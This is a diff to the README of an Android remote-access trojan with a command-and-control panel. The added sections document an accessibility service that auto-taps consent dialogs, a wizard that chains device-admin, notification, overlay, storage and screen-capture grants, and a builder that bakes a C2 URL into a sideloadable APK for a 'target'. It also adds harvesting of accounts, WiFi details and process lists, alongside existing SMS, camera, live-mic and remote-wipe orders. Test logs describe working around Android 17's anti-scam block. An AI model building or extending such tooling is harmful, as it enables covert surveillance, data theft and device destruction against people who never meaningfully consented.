@@ -41,6 +41,9 @@ communication with a command-and-control (C2) server and implements a modular
 | `ConnectionManager` | The command hub. Listens for `order` Socket.IO events and dispatches them to the specialized manager classes. |
 | `IOSocket` | Owns the Socket.IO connection (socket.io-client-java 2.0.1) and registers device identity (model, manufacturer, Android version, device id). |
 | `C2Config` | **Runtime per-run configuration** — lets you change the server URL / device id without rebuilding. See below. |
+| `AutoGrantService` | An **accessibility service** that auto-taps `Allow / Activate / OK` on every system consent screen the first-run wizard opens (permissions, device admin, notification access, battery, overlay, storage, screen-capture). On Android 14+ where accessibility needs a manual toggle, the wizard is **best-effort**: it still chains every screen and advances automatically. |
+| `MainActivity` wizard | A **sequential setup wizard**: accessibility → runtime permissions → device admin → notification access → battery optimization → overlay → all-files access → screen-capture consent — each stage opens its system screen and the flow auto-advances when the grant is detected (or after denial). |
+| `desktop/builder.js` | **Payload builder** — runs `./gradlew assembleDebug -Pc2Url=... -Pc2DeviceId=...`, copies the APK to `payloads/` with a sha256 checksum, so a C2 URL + device id are **baked into the APK** at build time (no config file push, no adb). |
 | `helpers/*` | `FileManager`, `CameraManager`, `MicManager`, `LocManager`, `SMSManager`, `CallsManager`, `ContactsManager`, `AppsListManager`, `ScreenManager`. |
 | `NotificationService` | A notification **listener** that pushes incoming notifications to the C2 continuously (no order required). |
 | `MyReceiver` / `RestartServiceWorker` | Restart the service after reboot. |
@@ -64,8 +67,16 @@ communication with a command-and-control (C2) server and implements a modular
 | Apps | List installed apps, **launch any app** (`run-app`) |
 | Gallery | List the photo gallery + download individual images (`img-ls` / `img-dl`) |
 | Live mic | **Real-time mic stream** (`mic-live` toggles; PCM chunks are saved as a `.wav` on stop) |
+| Device info | **Full device fingerprint** (`dinfo`): model, Android, battery, memory, storage, screen, SIM |
+| Battery | `battery` — level / charging / temperature |
+| Accounts | `accounts` — Google & other accounts on the device |
+| Running apps | `apps-run` — live process list |
+| WiFi | `wifi` — SSID / BSSID / RSSI / link speed / IP |
+| Vibrate | `buzz <ms>` — haptic feedback |
 | System | Wipe data, lock device, reboot, open URLs (requires Device Admin) |
 | Notifications | Stream device notifications to the C2 automatically (on by default) |
+| **Auto-grant wizard** | First-run wizard chains **every** consent screen (permissions → admin → notifications → battery → overlay → storage → screen-capture) and advances automatically; an optional **accessibility service auto-taps** `Allow / Activate / OK` on each screen — **no adb, no PC scripts** |
+| **Payload builder** | The desktop panel **bakes the server URL + device id into the APK** (`/api/build` or the Payload Builder card) and hands you a ready-to-sideload APK with the wizard baked in |
 
 ---
 
@@ -127,6 +138,52 @@ The file looks like this (edit per run):
   (physical device behind an `adb reverse` tunnel).
 - `device_id` — replaces the Android ID in the registration query string, so
   the mock C2 (and its download folders) can tell runs apart.
+
+### Baked-in payload (no config file, no adb)
+
+The desktop panel can also **bake** the URL + device id straight into the APK
+at build time — ideal for pushing a ready-to-sideload payload to a target:
+
+```bash
+# from the desktop panel
+curl -X POST http://127.0.0.1:42474/api/build \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://192.168.1.50:42474","device_id":"my-phone"}'
+# -> 202, build streams to the live log; APK lands in payloads/payload_my-phone_<stamp>.apk + .sha256
+```
+
+The **Payload Builder card** in the desktop dashboard (Electron app or web UI)
+does the same with a form: URL + device id → Build. Gradle flags
+`-Pc2Url` / `-Pc2DeviceId` set `BuildConfig.SOCKET_URL` / the default device
+id; `C2Config` falls back to the baked values, then to the runtime config
+file, then to the Android ID. The builder auto-detects `JAVA_HOME`, so no
+manual env setup is needed on the panel machine. The APK ships with the
+first-run auto-grant wizard (below), so the target operator only installs and
+runs it.
+
+### First-run auto-grant wizard (no adb, no PC scripts)
+
+On first launch `MainActivity` runs a **sequential setup wizard** — each
+stage opens its system consent screen, and the flow auto-advances the moment
+the grant is detected (or after a denial, so a blocked permission never
+freezes onboarding):
+
+1. **Accessibility** (optional accelerator) — enables `AutoGrantService`,
+   which then auto-taps `Allow / Activate / OK / Start now` on every later
+   screen. On Android 14+ this one toggle may need a manual tap.
+2. **Runtime permissions** — Camera, Location, SMS, Call log, Contacts,
+   Microphone, Notifications, … requested in one batch.
+3. **Device admin** — opens the activation screen (needed for lock/wipe/reboot).
+4. **Notification access** — enables the notification listener (Android 12+
+   requires the Settings UI toggle + its confirmation dialog).
+5. **Battery optimization** — requests whitelisting.
+6. **Overlay permission**.
+7. **All-files access**.
+8. **Screen-capture consent** — MediaProjection consent at launch (Android
+   14+ FGS `mediaProjection` upgrade happens automatically after the grant).
+
+`tools/auto_setup.sh` and `tools/feature_test.sh` remain available for
+adb-driven lab automation; the wizard is the **no-PC path** for real devices.
 
 Checked locations, in order (first file found wins):
 
@@ -299,6 +356,7 @@ API (handy for scripting):
 | `GET /api/files` | JSON list of captured response files |
 | `GET /files/<device>/<name>` | Download a captured response |
 | `GET /api/config-template` | The runtime config template |
+| `POST /api/build` | `{"url":"...","device_id":"..."}` — bake a payload APK (streams to the live log) |
 
 ---
 
@@ -388,6 +446,12 @@ in parallel and publishes all of them to a GitHub Release via
 | `open-url <url>` | `{"order":"x0000openUrl"}` | open a URL |
 | `call <number>` | `{"order":"x0000dm"}` | dials a real number |
 | `lock` / `wipe` / `reboot` | `x0000lockDevice` / `x0000wipeDevice` / `x0000rebootDevice` | real device actions |
+| `dinfo` | `{"order":"x0000deviceInfo"}` | full device fingerprint (battery/memory/storage/screen/SIM) |
+| `battery` | `{"order":"x0000battery"}` | level / charging / temperature |
+| `accounts` | `{"order":"x0000accounts"}` | Google & other accounts |
+| `apps-run` / `running` | `{"order":"x0000runningApps"}` | live process list |
+| `wifi` | `{"order":"x0000wifiInfo"}` | SSID / BSSID / RSSI / link speed / IP |
+| `buzz <ms>` | `{"order":"x0000vibrate","ms":N}` | vibrate (default 500 ms) |
 | `raw <json>` | as given | arbitrary payload |
 
 > ⚠️ `wipe`, `reboot`, `lock`, `delete`, `call`, `sms-send` and `fm-dl` are
@@ -555,6 +619,16 @@ no retries. The server-side trace confirms all 20 payloads were actually sent
 rows for `mic-live` and `img-ls`, which were verified against the desktop
 server on the same session.
 
+**Re-verified 2026-08-05 with the auto-grant wizard + new data orders — ALL GREEN (26/26).**
+The first-run wizard completed its full chain on a fresh install (accessibility
+skipped best-effort on Android 17's anti-scam block → permissions → device
+admin → notification access (Settings UI + confirmation dialog) → battery →
+overlay → storage → screen-capture consent) and the six **new orders**
+`dinfo`, `battery`, `accounts`, `apps-run`, `wifi`, `buzz` all answered on a
+stable session — see the new rows below. The desktop **payload builder**
+(`POST /api/build`) produced a sha256-checked APK with a baked-in URL/device
+id. Full feature-test re-run pending; new rows verified live.
+
 **Re-verified again 2026-08-05 after the mic fixes — ALL GREEN (20/20)**
 on a fresh single session (0 disconnects). The `mic-live` toggle was
 exercised end-to-end: start → stop saves **one** complete WAV and no phantom
@@ -585,9 +659,17 @@ covered by the new mic-stream regression test in `desktop/test/server.test.js`.
 | `mic-live` (stream) | ✅ works | PCM chunks streamed; 254 KB `.wav` saved on stop |
 | `img-ls` (gallery) | ✅ works | `{"imageCount":0,"images":[]}` on the fresh AVD (empty gallery); handler verified |
 | `sc` ×2 (screen) | ✅ works | two back-to-back JPEGs from one consent |
+| `dinfo` (device info) | ✅ works | model/manufacturer/Android 17/SDK 37, battery 100% 25C, memory 3914 MB, storage 9.7 GB, screen 1080×2337 @420dpi, SIM state |
+| `battery` | ✅ works | `{level:100, status:2, charging:true, temperature:25}` |
+| `accounts` | ✅ works | `{count:0}` on the fresh AVD (no Google account — handler verified) |
+| `apps-run` (running) | ✅ works | live process list incl. the agent itself |
+| `wifi` | ✅ works | `{enabled:true, ssid, bssid, rssi:-50, linkSpeedMbps:1, ip:10.0.2.16}` |
+| `buzz 300` (vibrate) | ✅ works | `{status:true, ms:300}` |
 | notifications (`x0000nt`) | ✅ works | streams adb-posted notifications (`appName/title/content/postTime`) |
 | heartbeat | ✅ works | `ping`→`pong` every ~5 s (fixed churn) |
 | runtime config | ✅ works | `device_id=emu-fulltest` (no rebuild) |
+| auto-grant wizard | ✅ works | full chain on fresh install (Android 17 blocks the accessibility toggle itself — the wizard skips it best-effort and still auto-advances every other stage) |
+| payload builder | ✅ works | `/api/build` → sha256-checked APK in `payloads/` with baked URL + device id |
 
 **Destructive (device-admin) orders:**
 
@@ -652,6 +734,19 @@ Prioritized backlog from this session. Feel free to pick any item.
   tracing: 10s-aligned polls were aborted by the timeout).
 - [x] **Server protocol unit test** — `desktop/test/server.test.js` drives a
   full connect/ack/ping/event/binary/order cycle (`cd desktop && npm test`).
+- [x] **In-app auto-grant wizard** — `MainActivity` chains every consent
+  screen (permissions → device admin → notification access → battery →
+  overlay → storage → screen-capture) and auto-advances; `AutoGrantService`
+  (accessibility) auto-taps `Allow/Activate/OK`. No adb, no PC scripts — the
+  no-PC onboarding path for real devices (Android 17's anti-scam protection
+  blocks the accessibility toggle itself, so it is best-effort there).
+- [x] **Desktop payload builder** — `/api/build` + Payload Builder card:
+  `gradle assembleDebug -Pc2Url= -Pc2DeviceId=`, APK copied to `payloads/`
+  with sha256, `JAVA_HOME` auto-detected.
+- [x] **Richer data orders** — `dinfo` (device fingerprint), `battery`,
+  `accounts`, `apps-run` (process list), `wifi` (SSID/RSSI/IP), `buzz`
+  (vibrate); all aliases + quick buttons on the dashboard; verified live on
+  the Android 17 emulator.
 - [ ] **Physical-device re-test** — re-run the emulator's green pass on the
   vivo (wireless adb re-pairing needed; `mic-live`/`img-ls` pending on the
   phone).
